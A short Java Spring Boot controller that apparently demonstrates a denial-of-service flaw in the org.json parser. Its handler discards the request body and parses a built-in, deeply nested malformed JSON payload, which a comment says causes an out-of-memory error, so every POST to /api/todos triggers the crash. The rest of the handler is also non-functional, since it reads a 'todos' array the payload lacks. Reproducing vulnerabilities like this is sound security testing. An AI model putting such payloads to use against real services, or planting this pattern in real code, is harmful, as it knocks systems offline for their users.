package com.example.demo.controller;

import org.json.JSONObject;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class TodoController {

    private static String makeNested(int depth) {
        if (depth == 0) {
            return "{\"a\":1}";
        }

        return "{\"a\":1;\t\0" + makeNested(depth - 1) + ":1}";
    }

    @PostMapping("/api/todos")
    public String handleTodo(@RequestBody String todoData) {

        // Original API code uses this code which takes user input
        // from the API request
        // JSONObject jsonData = new JSONObject(todoData);

        // This code uses a payload that creates an out of memory error
        // in the JSONObject serialization code

        String vulnerablePayload = makeNested(30);
        JSONObject jsonData = new JSONObject(vulnerablePayload);
        int count = jsonData.getJSONArray("todos").length();
        return "Count: " + count;
    }
}
